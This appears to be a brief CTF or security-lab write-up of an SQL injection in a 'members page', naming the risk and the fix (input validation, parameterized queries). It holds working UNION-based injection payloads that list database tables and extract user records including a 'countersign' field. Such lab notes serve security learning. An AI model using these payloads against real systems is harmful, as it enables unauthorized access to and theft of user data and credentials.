- Risk: Access to all database information
- solution: input validation and parametrized queries including prepared statements
- Method: in members page
    - using semicolon to check if an sql injection detect
    - Passing corespondent value and add union to get additional info
        - **EX**:
            
            ```jsx
            //extract all tables from database
            UNION SELECT table_schema, table_name FROM information_schema.tables
            //get all users
            1 UNION (SELECT user_id,CONCAT(town, country,  planet, Commentaire, countersign) from users)--
            ```